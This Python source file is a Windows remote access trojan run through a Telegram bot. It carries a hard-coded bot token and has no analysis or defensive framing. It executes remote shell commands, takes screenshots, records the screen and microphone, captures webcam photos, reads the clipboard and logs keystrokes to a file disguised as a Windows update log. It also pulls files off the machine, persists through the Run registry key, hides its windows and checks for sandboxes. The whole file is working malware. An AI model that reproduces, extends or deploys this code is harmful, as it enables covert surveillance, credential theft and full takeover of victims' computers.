#!/usr/bin/env python3

import asyncio
import os
import subprocess
import sys
import time
import winreg
import threading
import tempfile
from pathlib import Path
import requests
import io
import ctypes

TOKEN = "8712703116:AAHIM3J2jUehA9Gp1bNSA6LJUge9CsQVnpM"

def __junk():
    _ = [x for x in range(10)]
    __ = {i: i**2 for i in range(5)}
    pass

LOG_FILE = Path(__file__).parent / "bot.log"

def log_command(command, result=""):
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"{time.ctime()} - {command}: {result}\n")
    except Exception:
        pass

def _is_sandbox():
    try:
        output = subprocess.check_output("systeminfo | findstr /i 'System Model'", shell=True, timeout=5)
        if output:
            model = output.decode().lower()
            vm_indicators = ["vbox", "vmware", "qemu", "virtual", "xen"]
            if any(ind in model for ind in vm_indicators):
                return True
    except Exception:
        pass
    try:
        result = subprocess.run("wmic os get TotalVisibleMemorySize", capture_output=True, text=True, shell=True, timeout=3)
        if result.returncode == 0:
            lines = result.stdout.split()
            if len(lines) > 1 and int(lines[1]) < 4_000_000:
                return True
    except Exception:
        pass
    try:
        if os.cpu_count() and os.cpu_count() < 2:
            return True
    except Exception:
        pass
    return False

DEFAULT_DIR = f"C:\\Users\\{os.getenv('USERNAME')}"
CHAT_ID_FILE = Path(os.getenv('APPDATA')) / "telegram_cmd_bot_chat_id.txt"
PERSISTENCE_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
PERSISTENCE_NAME = "TelegramCmdBot"

KEYLOG_FILE = Path(os.getenv('APPDATA')) / "windows_update.log"
KEYLOG_RUNNING = False
KEYLOG_LOCK = threading.Lock()
KEYLOG_LISTENER = None

def set_persistence(enable=True):
    key = winreg.HKEY_CURRENT_USER
    try:
        with winreg.OpenKey(key, PERSISTENCE_KEY, 0, winreg.KEY_SET_VALUE) as reg_key:
            if enable:
                pythonw = sys.executable.replace("python.exe", "pythonw.exe")
                script = os.path.abspath(__file__)
                cmd = f'"{pythonw}" "{script}"'
                winreg.SetValueEx(reg_key, PERSISTENCE_NAME, 0, winreg.REG_SZ, cmd)
            else:
                winreg.DeleteValue(reg_key, PERSISTENCE_NAME)
    except Exception as e:
        print(f"Persistence operation failed: {e}")

def run_cmd(command, cwd=None):
    if not cwd:
        cwd = DEFAULT_DIR
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    process = subprocess.Popen(
        command,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        shell=True,
        cwd=cwd,
        startupinfo=startupinfo,
        creationflags=subprocess.CREATE_NO_WINDOW,
        text=True
    )
    stdout, stderr = process.communicate(timeout=60)
    return stdout, stderr

def is_connected():
    try:
        import urllib.request
        urllib.request.urlopen("https://www.google.com", timeout=5)
        return True
    except Exception:
        return False

def save_chat_id(chat_id):
    with open(CHAT_ID_FILE, 'w') as f:
        f.write(str(chat_id))

def load_chat_id():
    if CHAT_ID_FILE.exists():
        with open(CHAT_ID_FILE, 'r') as f:
            return int(f.read().strip())
    return None

def capture_screenshot():
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format='PNG')
        buf.seek(0)
        return buf
    except Exception as e:
        return f"Screenshot failed: {e}"

def screen_record_5sec():
    try:
        import cv2
        import numpy as np
        from PIL import ImageGrab
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        fps = 10.0
        screen = ImageGrab.grab()
        width, height = screen.size
        out_file = tempfile.NamedTemporaryFile(suffix='.avi', delete=False)
        out_path = out_file.name
        out_file.close()
        out = cv2.VideoWriter(out_path, fourcc, fps, (width, height))
        start_time = time.time()
        while time.time() - start_time < 5:
            img = ImageGrab.grab()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            out.write(frame)
            time.sleep(1/fps)
        out.release()
        return out_path
    except Exception as e:
        return f"Screen record failed: {e}"

def get_audio_devices_pyaudio():
    try:
        import pyaudio
        p = pyaudio.PyAudio()
        devices = []
        for i in range(p.get_device_count()):
            dev = p.get_device_info_by_index(i)
            if dev['maxInputChannels'] > 0:
                devices.append((i, dev['name']))
        p.terminate()
        return devices
    except:
        return []

def mic_record_5sec():
    try:
        import pyaudio
        import wave
    except ImportError:
        return "PyAudio not installed. Run: pip install pyaudio"

    devices = get_audio_devices_pyaudio()
    if not devices:
        try:
            import sounddevice as sd
            import numpy as np
            import wave
            duration = 5
            fs = 44100
            recording = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype='int16')
            sd.wait()
            out_file = tempfile.NamedTemporaryFile(suffix='.wav', delete=False)
            out_path = out_file.name
            out_file.close()
            with wave.open(out_path, 'wb') as wf:
                wf.setnchannels(1)
                wf.setsampwidth(2)
                wf.setframerate(fs)
                wf.writeframes(recording.tobytes())
            return out_path
        except ImportError:
            return "No audio input devices found and sounddevice not installed. Install sounddevice: pip install sounddevice"
        except Exception as e:
            return f"Audio recording with sounddevice failed: {e}"

    try:
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        RECORD_SECONDS = 5
        p = pyaudio.PyAudio()
        device_idx = devices[0][0]
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE,
                        input=True, input_device_index=device_idx,
                        frames_per_buffer=CHUNK)
        frames = []
        for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        p.terminate()
        out_file = tempfile.NamedTemporaryFile(suffix='.wav', delete=False)
        out_path = out_file.name
        out_file.close()
        wf = wave.open(out_path, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        return out_path
    except Exception as e:
        return f"Mic recording with PyAudio failed: {e}"

def webcam_5pics():
    try:
        import cv2
    except ImportError:
        return "OpenCV not installed. Run: pip install opencv-python"

    for idx in range(5):
        cap = cv2.VideoCapture(idx)
        if cap.isOpened():
            break
    else:
        return "Webcam not accessible. No camera found (tried indices 0-4)."

    pics = []
    for i in range(5):
        ret, frame = cap.read()
        if not ret:
            cap.release()
            if pics:
                return pics
            else:
                return "Webcam failed to capture any image."
        out_file = tempfile.NamedTemporaryFile(suffix='.jpg', delete=False)
        out_path = out_file.name
        out_file.close()
        cv2.imwrite(out_path, frame)
        pics.append(out_path)
        time.sleep(0.5)
    cap.release()
    return pics

def get_process_list():
    out, err = run_cmd("tasklist")
    return out if out else err

def kill_process(proc_name):
    cmd = f"taskkill /F /IM {proc_name}"
    out, err = run_cmd(cmd)
    return out if out else err

def get_clipboard():
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data if data else "Clipboard is empty"
    except Exception as e:
        return f"Failed to read clipboard: {e}"

def system_shutdown():
    return run_cmd("shutdown /s /t 0")

def system_restart():
    return run_cmd("shutdown /r /t 0")

def system_sleep():
    return run_cmd("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")

def clear_logs():
    try:
        if LOG_FILE.exists():
            LOG_FILE.unlink()
            return "Bot log file cleared."
        else:
            return "No log file to clear."
    except Exception as e:
        return f"Failed to clear log: {e}"

def list_devices():
    msg = "=== Audio Input Devices ===\n"
    try:
        import pyaudio
        p = pyaudio.PyAudio()
        for i in range(p.get_device_count()):
            dev = p.get_device_info_by_index(i)
            if dev['maxInputChannels'] > 0:
                msg += f"  [{i}] {dev['name']} (ch={dev['maxInputChannels']})\n"
        p.terminate()
    except Exception as e:
        msg += f"PyAudio error: {e}\n"

    msg += "\n=== Video Input Devices ===\n"
    try:
        import cv2
        for idx in range(5):
            cap = cv2.VideoCapture(idx)
            if cap.isOpened():
                msg += f"  Camera index {idx} is available\n"
                cap.release()
            else:
                msg += f"  Camera index {idx} not available\n"
    except Exception as e:
        msg += f"OpenCV error: {e}\n"
    return msg

def on_press(key):
    try:
        with KEYLOG_LOCK:
            with open(KEYLOG_FILE, 'a', encoding='utf-8') as f:
                try:
                    if hasattr(key, 'char') and key.char is not None:
                        if key.char.isprintable():
                            f.write(key.char)
                        else:
                            f.write(f'[{key.char}]')
                    else:
                        name = str(key).replace('Key.', '')
                        if name == 'space':
                            f.write(' ')
                        elif name == 'enter':
                            f.write('\n')
                        elif name == 'backspace':
                            f.write('[BACKSPACE]')
                        elif name == 'tab':
                            f.write('[TAB]')
                        elif name == 'shift' or name == 'shift_r':
                            f.write('[SHIFT]')
                        elif name == 'ctrl_l' or name == 'ctrl_r':
                            f.write('[CTRL]')
                        elif name == 'alt_l' or name == 'alt_r':
                            f.write('[ALT]')
                        elif name == 'cmd' or name == 'win':
                            f.write('[WIN]')
                        elif name == 'caps_lock':
                            f.write('[CAPSLOCK]')
                        elif name == 'delete':
                            f.write('[DELETE]')
                        elif name == 'up':
                            f.write('[UP]')
                        elif name == 'down':
                            f.write('[DOWN]')
                        elif name == 'left':
                            f.write('[LEFT]')
                        elif name == 'right':
                            f.write('[RIGHT]')
                        elif name == 'page_up':
                            f.write('[PAGEUP]')
                        elif name == 'page_down':
                            f.write('[PAGEDOWN]')
                        elif name == 'home':
                            f.write('[HOME]')
                        elif name == 'end':
                            f.write('[END]')
                        elif name == 'insert':
                            f.write('[INSERT]')
                        elif name == 'print_screen':
                            f.write('[PRTSC]')
                        elif name == 'pause':
                            f.write('[PAUSE]')
                        elif name == 'esc':
                            f.write('[ESC]')
                        elif name == 'menu':
                            f.write('[MENU]')
                        elif name == 'num_lock':
                            f.write('[NUMLOCK]')
                        elif name == 'scroll_lock':
                            f.write('[SCROLLLOCK]')
                        else:
                            f.write(f'[{name.upper()}]')
                except Exception:
                    f.write('[UNKNOWN]')
    except:
        pass

def start_keylogger():
    global KEYLOG_RUNNING, KEYLOG_LISTENER
    with KEYLOG_LOCK:
        if KEYLOG_RUNNING:
            return False
        KEYLOG_RUNNING = True
    try:
        from pynput import keyboard
    except ImportError:
        with KEYLOG_LOCK:
            KEYLOG_RUNNING = False
        return "pynput not installed. Please install: pip install pynput"

    if KEYLOG_FILE.exists():
        KEYLOG_FILE.unlink()
    try:
        KEYLOG_LISTENER = keyboard.Listener(on_press=on_press)
        KEYLOG_LISTENER.start()
        return True
    except Exception as e:
        with KEYLOG_LOCK:
            KEYLOG_RUNNING = False
        return f"Failed to start listener: {e}"

def stop_keylogger():
    global KEYLOG_RUNNING, KEYLOG_LISTENER
    with KEYLOG_LOCK:
        if not KEYLOG_RUNNING:
            return None
        KEYLOG_RUNNING = False
    if KEYLOG_LISTENER:
        KEYLOG_LISTENER.stop()
        KEYLOG_LISTENER = None
    if KEYLOG_FILE.exists():
        with open(KEYLOG_FILE, 'r', encoding='utf-8') as f:
            data = f.read()
        KEYLOG_FILE.unlink()
        return data
    return "No keylog data captured."

def send_active_message_thread():
    chat_id = load_chat_id()
    if not chat_id:
        return
    while not is_connected():
        time.sleep(5)
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": chat_id, "text": "✅ Bot is now active and online."}, timeout=10)
    except Exception:
        pass

from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

current_dir = DEFAULT_DIR

async def send_file(update, file_path, caption, as_document=False):
    try:
        if as_document:
            with open(file_path, 'rb') as f:
                await update.message.reply_document(document=f, caption=caption)
        else:
            with open(file_path, 'rb') as f:
                await update.message.reply_photo(photo=f, caption=caption)
    except Exception as e:
        await update.message.reply_text(f"Error sending file: {e}")
    finally:
        if os.path.exists(file_path):
            try:
                os.remove(file_path)
            except:
                pass

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    save_chat_id(chat_id)
    log_command("/start", f"chat_id={chat_id}")
    await update.message.reply_text(
        "🤖 **System Control Bot**\n\n"
        "Commands:\n"
        "`/cmd <command>` – execute CMD\n"
        "`/cd <path>` – change directory\n"
        "`/pwd` – show current directory\n"
        "`/screenshot` – capture screen\n"
        "`/screen_record` – record screen (5s)\n"
        "`/mic` – record mic (5s)\n"
        "`/web_cam` – take 5 webcam pics\n"
        "`/process` – list processes\n"
        "`/kill <name>` – kill process by name\n"
        "`/clipboard` – get clipboard text\n"
        "`/shutdown` – shutdown system\n"
        "`/restart` – restart system\n"
        "`/sleep` – sleep system\n"
        "`/clear_logs` – clear bot's log file\n"
        "`/list_devices` – list audio/video devices\n"
        "`/get <file_path>` – download a file from system\n"
        "`/key -start` – start keylogger\n"
        "`/key -stop` – stop keylogger and send log\n"
        "`/uninstall` – remove persistence\n"
        "`/help` – this message\n\n"
        "**Upload** any file to save it in current directory.",
        parse_mode='Markdown'
    )

async def cmd_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_dir
    user_input = update.message.text
    if not user_input.startswith('/cmd '):
        return
    command = user_input[5:].strip()
    if not command:
        await update.message.reply_text("Usage: /cmd <command>")
        return
    try:
        out, err = run_cmd(command, cwd=current_dir)
        response = f"📁 {current_dir}\n$ {command}\n"
        if out:
            response += out
        if err:
            response += "\n[stderr]\n" + err
        if not response.strip():
            response = "(no output)"
        if len(response) > 4000:
            response = response[:4000] + "\n... (truncated)"
        await update.message.reply_text(response)
        log_command(f"/cmd {command}", "OK")
    except Exception as e:
        err_msg = f"❌ Error: {e}"
        await update.message.reply_text(err_msg)
        log_command(f"/cmd {command}", f"ERROR: {e}")

async def cd_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_dir
    user_input = update.message.text
    if not user_input.startswith('/cd '):
        return
    new_path = user_input[4:].strip()
    if not new_path:
        await update.message.reply_text("Usage: /cd <path>")
        return
    try:
        full_path = os.path.abspath(os.path.join(current_dir, new_path))
        if os.path.isdir(full_path):
            current_dir = full_path
            await update.message.reply_text(f"✅ Directory changed to: {current_dir}")
            log_command(f"/cd {new_path}", f"-> {current_dir}")
        else:
            await update.message.reply_text(f"❌ Directory not found: {full_path}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def pwd_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_dir
    await update.message.reply_text(f"📁 {current_dir}")

async def help_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

async def screenshot_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📸 Capturing screenshot...")
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, capture_screenshot)
    if isinstance(result, str):
        await update.message.reply_text(f"❌ {result}")
        log_command("/screenshot", f"ERROR: {result}")
    else:
        await update.message.reply_photo(photo=result, caption="📸 Screenshot")
        log_command("/screenshot", "OK")

async def screen_record_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🎥 Recording screen for 5 seconds...")
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, screen_record_5sec)
    if isinstance(result, str) and (not os.path.exists(result)):
        await update.message.reply_text(f"❌ Failed: {result}")
        log_command("/screen_record", f"ERROR: {result}")
    else:
        await send_file(update, result, "🎥 Screen recording (5s)", as_document=True)
        log_command("/screen_record", "OK")

async def mic_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🎤 Recording microphone for 5 seconds...")
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, mic_record_5sec)
    if isinstance(result, str) and (not os.path.exists(result)):
        await update.message.reply_text(f"❌ Failed: {result}")
        log_command("/mic", f"ERROR: {result}")
    else:
        with open(result, 'rb') as f:
            await update.message.reply_audio(audio=f, caption="🎤 Mic recording (5s)")
        try:
            os.remove(result)
        except:
            pass
        log_command("/mic", "OK")

async def webcam_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📷 Capturing 5 webcam photos...")
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, webcam_5pics)
    if isinstance(result, str):
        await update.message.reply_text(f"❌ {result}")
        log_command("/web_cam", f"ERROR: {result}")
    else:
        sent = 0
        for path in result:
            try:
                with open(path, 'rb') as f:
                    await update.message.reply_photo(photo=f, caption=f"📷 Webcam pic {sent+1}/5")
                sent += 1
                os.remove(path)
            except Exception as e:
                await update.message.reply_text(f"Error sending photo: {e}")
        if sent == 0:
            await update.message.reply_text("Failed to capture any photos.")
            log_command("/web_cam", "ERROR: no photos")
        else:
            log_command("/web_cam", f"OK ({sent} photos)")

async def process_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📋 Fetching process list...")
    out = get_process_list()
    if not out:
        out = "No output"
    if len(out) > 4000:
        out = out[:4000] + "\n... (truncated)"
    await update.message.reply_text(f"```\n{out}\n```", parse_mode='Markdown')
    log_command("/process", "OK")

async def kill_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text
    if not user_input.startswith('/kill '):
        return
    proc_name = user_input[6:].strip()
    if not proc_name:
        await update.message.reply_text("Usage: /kill <process_name>")
        return
    out = kill_process(proc_name)
    await update.message.reply_text(f"Kill result:\n{out if out else 'Done'}")
    log_command(f"/kill {proc_name}", out if out else "Done")

async def clipboard_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = get_clipboard()
    if len(data) > 4000:
        data = data[:4000] + "\n... (truncated)"
    await update.message.reply_text(f"📋 Clipboard:\n{data}")
    log_command("/clipboard", "OK")

async def shutdown_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("⚠️ Shutting down system...")
    out, err = system_shutdown()
    await update.message.reply_text(f"Shutdown command executed.\n{out if out else err}")
    log_command("/shutdown", "OK")

async def restart_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("⚠️ Restarting system...")
    out, err = system_restart()
    await update.message.reply_text(f"Restart command executed.\n{out if out else err}")
    log_command("/restart", "OK")

async def sleep_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("💤 Putting system to sleep...")
    out, err = system_sleep()
    await update.message.reply_text(f"Sleep command executed.\n{out if out else err}")
    log_command("/sleep", "OK")

async def clear_logs_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    result = clear_logs()
    await update.message.reply_text(f"🧹 Log cleared:\n{result}")
    log_command("/clear_logs", result)

async def list_devices_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔍 Enumerating devices...")
    result = list_devices()
    if len(result) > 4000:
        result = result[:4000] + "\n... (truncated)"
    await update.message.reply_text(f"```\n{result}\n```", parse_mode='Markdown')
    log_command("/list_devices", "OK")

async def uninstall_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    set_persistence(False)
    await update.message.reply_text("✅ Persistence removed. Bot will not start on next boot. You can still stop this instance manually.")
    log_command("/uninstall", "OK")

async def get_file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text
    if not user_input.startswith('/get '):
        return
    file_path = user_input[5:].strip()
    if not file_path:
        await update.message.reply_text("Usage: /get <full_path_to_file>")
        return
    if not os.path.exists(file_path):
        await update.message.reply_text(f"❌ File not found: {file_path}")
        log_command(f"/get {file_path}", "ERROR: not found")
        return
    if not os.path.isfile(file_path):
        await update.message.reply_text(f"❌ Not a regular file: {file_path}")
        log_command(f"/get {file_path}", "ERROR: not a file")
        return
    try:
        with open(file_path, 'rb') as f:
            await update.message.reply_document(document=f, filename=os.path.basename(file_path))
        log_command(f"/get {file_path}", "OK")
    except Exception as e:
        await update.message.reply_text(f"❌ Error sending file: {e}")
        log_command(f"/get {file_path}", f"ERROR: {e}")

async def key_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text
    if not user_input.startswith('/key '):
        return
    subcmd = user_input[5:].strip().lower()
    if subcmd == '-start':
        result = start_keylogger()
        if result is True:
            await update.message.reply_text("✅ Keylogger started. Logs are being saved.")
            log_command("/key -start", "OK")
        else:
            await update.message.reply_text(f"❌ Failed to start keylogger: {result}")
            log_command("/key -start", f"ERROR: {result}")
    elif subcmd == '-stop':
        log_data = stop_keylogger()
        if log_data is None:
            await update.message.reply_text("❌ Keylogger was not running.")
            log_command("/key -stop", "ERROR: not running")
        else:
            if len(log_data) > 0:
                if len(log_data) > 4000:
                    log_data = log_data[:4000] + "\n... (truncated)"
                await update.message.reply_text(f"📝 Keylog data:\n```\n{log_data}\n```", parse_mode='Markdown')
            else:
                await update.message.reply_text("📝 No keylog data captured.")
            log_command("/key -stop", "OK")
    else:
        await update.message.reply_text("Usage: /key -start or /key -stop")

async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_dir
    message = update.message
    file_obj = None
    filename = None

    if message.document:
        file_obj = message.document
        filename = file_obj.file_name or f"document_{int(time.time())}"
    elif message.photo:
        file_obj = message.photo[-1]
        filename = f"photo_{int(time.time())}.jpg"
    elif message.audio:
        file_obj = message.audio
        filename = file_obj.file_name or f"audio_{int(time.time())}.mp3"
    elif message.video:
        file_obj = message.video
        filename = file_obj.file_name or f"video_{int(time.time())}.mp4"
    elif message.video_note:
        file_obj = message.video_note
        filename = f"video_note_{int(time.time())}.mp4"
    elif message.voice:
        file_obj = message.voice
        filename = f"voice_{int(time.time())}.ogg"
    else:
        return

    if file_obj is None:
        return

    os.makedirs(current_dir, exist_ok=True)
    filename = os.path.basename(filename)
    if not filename:
        filename = f"file_{int(time.time())}"
    base, ext = os.path.splitext(filename)
    full_path = os.path.join(current_dir, filename)
    counter = 1
    while os.path.exists(full_path):
        new_name = f"{base}_{counter}{ext}"
        full_path = os.path.join(current_dir, new_name)
        counter += 1

    try:
        new_file = await file_obj.get_file()
        await new_file.download_to_drive(full_path)
        await update.message.reply_text(f"✅ File saved successfully.\n📁 {full_path}")
        log_command(f"UPLOAD {filename}", f"saved to {full_path}")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to save file: {e}")
        log_command(f"UPLOAD {filename}", f"ERROR: {e}")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"Update {update} caused error {context.error}")
    try:
        await update.message.reply_text(f"⚠️ An error occurred: {context.error}")
    except:
        pass

def main():
    if _is_sandbox():
        print("Sandbox detected – running in limited mode.")

    if len(sys.argv) > 1:
        if sys.argv[1] == "--install":
            set_persistence(True)
            print("Persistence installed.")
            sys.exit(0)
        elif sys.argv[1] == "--uninstall":
            set_persistence(False)
            print("Persistence removed.")
            sys.exit(0)
        else:
            print("Usage: python bot.py [--install | --uninstall]")
            sys.exit(1)

    global current_dir
    current_dir = DEFAULT_DIR

    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_handler))
    application.add_handler(CommandHandler("cmd", cmd_handler))
    application.add_handler(CommandHandler("cd", cd_handler))
    application.add_handler(CommandHandler("pwd", pwd_handler))
    application.add_handler(CommandHandler("screenshot", screenshot_handler))
    application.add_handler(CommandHandler("screen_record", screen_record_handler))
    application.add_handler(CommandHandler("mic", mic_handler))
    application.add_handler(CommandHandler("web_cam", webcam_handler))
    application.add_handler(CommandHandler("process", process_handler))
    application.add_handler(CommandHandler("kill", kill_handler))
    application.add_handler(CommandHandler("clipboard", clipboard_handler))
    application.add_handler(CommandHandler("shutdown", shutdown_handler))
    application.add_handler(CommandHandler("restart", restart_handler))
    application.add_handler(CommandHandler("sleep", sleep_handler))
    application.add_handler(CommandHandler("clear_logs", clear_logs_handler))
    application.add_handler(CommandHandler("list_devices", list_devices_handler))
    application.add_handler(CommandHandler("get", get_file_handler))
    application.add_handler(CommandHandler("key", key_handler))
    application.add_handler(CommandHandler("uninstall", uninstall_handler))

    application.add_handler(MessageHandler(
        filters.Document.ALL | filters.PHOTO | filters.AUDIO | filters.VIDEO |
        filters.VOICE | filters.VIDEO_NOTE,
        upload_handler
    ))

    application.add_error_handler(error_handler)

    active_thread = threading.Thread(target=send_active_message_thread, daemon=True)
    active_thread.start()

    print("Bot is running...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()